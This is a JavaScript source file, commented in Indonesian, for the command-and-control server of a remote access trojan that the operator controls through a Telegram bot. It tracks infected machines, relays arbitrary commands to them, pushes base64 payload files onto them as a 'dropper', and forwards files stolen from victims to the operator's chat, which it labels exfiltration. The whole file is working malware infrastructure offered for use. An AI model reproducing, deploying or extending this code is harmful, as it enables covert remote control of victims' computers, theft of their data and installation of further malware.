const express = require('express');
const axios = require('axios');
const FormData = require('form-data'); // Wajib ada untuk kirim file ke Telegram
const app = express();

// --- PERBAIKAN PENTING (LIMIT 50MB) ---
// Tanpa ini, upload gambar/file akan GAGAL.
app.use(express.json({ limit: '5000mb' }));
app.use(express.urlencoded({ limit: '5000mb', extended: true }));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN_B; // Token Bot RAT
const CHAT_ID = process.env.CHAT_ID;

// --- DATABASE SEMENTARA (MEMORY) ---
let onlineBots = {}; 
let currentTarget = "ALL"; 
let commandData = {
    id: 0,      
    cmd: "",    
    payload: "" 
};

// --- FUNGSI BANTUAN KIRIM PESAN ---
async function sendTelegram(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("TG Error:", e.message); }
}

// --- LOGIKA UTAMA: CEK UPDATE DARI TELEGRAM ---
let lastUpdateId = 0;
async function checkTelegramUpdates() {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
        const resp = await axios.get(url);
        const updates = resp.data.result;

        if (updates.length > 0) {
            for (const update of updates) {
                lastUpdateId = update.update_id;
                const message = update.message;
                if (!message) continue;

                // A. JIKA ADMIN KIRIM TEKS
                if (message.text) {
                    const text = message.text;

                    if (text === '/bots') {
                        let list = "🤖 **ONLINE BOTS (Last 30s):**\n";
                        let count = 0;
                        const now = Date.now();
                        for (const [id, time] of Object.entries(onlineBots)) {
                            if (now - time < 30000) { 
                                list += `- \`${id}\`\n`;
                                count++;
                            }
                        }
                        if (count === 0) list += "(No bots active)";
                        list += `\n🎯 Target: \`${currentTarget}\``;
                        await sendTelegram(list);
                    }
                    else if (text.startsWith('/target ')) {
                        currentTarget = text.replace('/target ', '').trim();
                        await sendTelegram(`🎯 Target set to: \`${currentTarget}\``);
                    }
                    else if (text.startsWith('/cmd ')) {
                        const cmd = text.replace('/cmd ', '').trim();
                        commandData = {
                            id: Date.now(),
                            cmd: cmd,
                            payload: "" 
                        };
                        await sendTelegram(`🚀 Command sent to **${currentTarget}**: \`${cmd}\``);
                    }
                }

                // B. JIKA ADMIN KIRIM FILE (REVERSE DROPPER)
                else if (message.document) {
                    const fileId = message.document.file_id;
                    const fileName = message.document.file_name;

                    await sendTelegram(`⏳ Receiving payload: \`${fileName}\`...`);

                    const fileInfo = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
                    const filePath = fileInfo.data.result.file_path;
                    const downloadUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;

                    const fileData = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
                    const base64Str = Buffer.from(fileData.data).toString('base64');

                    commandData = {
                        id: Date.now(),
                        cmd: `save ${fileName}`, 
                        payload: base64Str       
                    };

                    await sendTelegram(`☢️ **DROPPER ACTIVE**: \`${fileName}\` sent to **${currentTarget}**!`);
                }
            }
        }
    } catch (e) { /* Ignore error */ }
}

// --- ENDPOINT 1: POLLING ---
app.post('/poll', async (req, res) => {
    try {
        const { bot_id } = req.body;
        if (bot_id) onlineBots[bot_id] = Date.now();

        await checkTelegramUpdates();

        let isTarget = (currentTarget === "ALL" || currentTarget === bot_id);
        
        if (isTarget && commandData.cmd !== "") {
            return res.json({
                status: "command",
                id: commandData.id,
                cmd: commandData.cmd,
                payload: commandData.cmd.startsWith("save ") ? commandData.payload : ""
            });
        }
        return res.json({ status: "idle" });

    } catch (e) { res.json({ status: "error" }); }
});

// --- ENDPOINT 2: REPORT (UPLOAD FILE & LOGS) ---
app.post('/report', async (req, res) => {
    try {
        const { id, aes, chacha } = req.body;

        // A. JIKA RAT MENGIRIM FILE (EXFILTRATION)
        if (chacha.startsWith("upload ")) {
            const filename = chacha.replace("upload ", "").trim();
            console.log(`[INFO] Receiving File: ${filename} from ${id}`);

            // Konversi Base64 balik ke Buffer
            const fileBuffer = Buffer.from(aes, 'base64');

            // Kirim ke Telegram sebagai Dokumen
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('document', fileBuffer, { filename: filename });
            form.append('caption', `📂 Exfiltrated from: \`${id}\``);

            // Tambahkan maxContentLength agar Axios tidak menolak file besar
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity
            });
        } 
        // B. JIKA RAT LAPOR TEKS BIASA
        else {
            const msg = `💻 **${id}**\ncmd: \`${chacha}\`\n\n\`\`\`\n${aes}\n\`\`\``;
            await sendTelegram(msg);
        }

        res.json({ status: 'success' });
    } catch (e) { 
        console.error("Report Error:", e.message);
        res.json({ status: 'error' }); 
    }
});

app.listen(PORT, () => console.log(`RAT C2 Server Running`));
